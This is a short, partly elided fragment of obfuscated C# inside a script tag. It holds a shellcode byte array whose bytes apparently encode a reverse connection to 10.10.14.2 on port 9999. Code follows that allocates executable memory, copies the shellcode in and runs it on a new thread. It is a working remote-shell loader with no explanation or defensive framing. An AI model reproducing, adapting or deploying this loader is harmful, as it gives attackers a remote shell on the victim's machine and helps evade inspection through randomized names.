...
0x68,0x0a,0x0a,0x0e,0x02,0x68,0x02,0x00,0x27,0x0f,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr kundAzkbr3x1 = VirtualAlloc(IntPtr.Zero,(UIntPtr)u4GnLuQ76z.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(u4GnLuQ76z,0,kundAzkbr3x1,u4GnLuQ76z.Length);
        IntPtr pU_y = IntPtr.Zero;
        IntPtr oHgmtZGzYtkG = CreateThread(IntPtr.Zero,UIntPtr.Zero,kundAzkbr3x1,IntPtr.Zero,0,ref pU_y);
    }
</script>
